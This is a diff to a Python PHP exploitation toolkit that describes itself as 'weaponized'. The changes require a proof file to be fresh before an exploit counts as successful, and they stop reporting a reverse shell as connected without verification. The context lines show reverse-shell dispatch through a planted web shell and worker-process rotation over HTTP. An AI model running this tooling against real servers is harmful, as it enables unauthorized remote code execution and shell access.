@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PHP2Shell Toolkit (v2.2.0)
+PHP2Shell Toolkit (v2.2.1)
 ==========================
 
 All-in-one defensive auditing and weaponized exploitation suite for
@@ -480,6 +480,16 @@ class ExploitResult:
 # ---------------------------------------------------------------------------
 # SHARED UTILITIES & MULTIPART BUILDERS
 # ---------------------------------------------------------------------------
+
+def proof_file_is_fresh(path: str, before: Optional[Tuple[int, int]]) -> bool:
+    """True only if local proof file exists and is new or changed since baseline."""
+    try:
+        stat = os.stat(path)
+    except OSError:
+        return False
+    current = (stat.st_mtime_ns, stat.st_size)
+    return before is None or current != before
+
 
 def parse_php_version(version_str: str) -> Optional[Tuple[int, int, int]]:
     clean = re.sub(r"[-+].*$", "", version_str.strip())
@@ -1305,6 +1315,15 @@ class UnifiedPHP2Shell:
                     profile=profile,
                 )
 
+                # A pre-existing local file is not evidence of this exploit attempt.
+                proof_before = None
+                if proof_file:
+                    try:
+                        proof_stat = os.stat(proof_file)
+                        proof_before = (proof_stat.st_mtime_ns, proof_stat.st_size)
+                    except OSError:
+                        pass
+
                 self.progress("  └─ Stage 0:", "Rotating worker process over HTTP...", Fore.BLUE)
                 engine_52704.rotate()
 
@@ -1341,7 +1360,7 @@ class UnifiedPHP2Shell:
                                 pass
                             time.sleep(0.5)
 
-                            if proof_file and os.path.exists(proof_file):
+                            if proof_file and proof_file_is_fresh(proof_file, proof_before):
                                 with open(proof_file, "r", encoding="latin1") as pf:
                                     res.command_output = pf.read().strip()
                                     res.status = ExploitStatus.SUCCESS
@@ -1451,8 +1470,9 @@ class UnifiedPHP2Shell:
                 self.progress("  └─ [Reverse Shell]:", f"Dispatching callback to {lhost}:{lport}...", Fore.MAGENTA)
                 rev = generate_reverse_shell_cmd(lhost, lport)
                 threading.Thread(target=self.execute_webshell_cmd, args=(live_shell, param, rev), daemon=True).start()
-                res.reverse_shell_connected = True
-                res.status = ExploitStatus.SHELL_SPAWNED
+                # Dispatching a callback is not proof that a listener accepted it.
+                res.reverse_shell_connected = False
+                res.details = "Reverse shell callback requested, connection not independently verified."
 
             return res
 
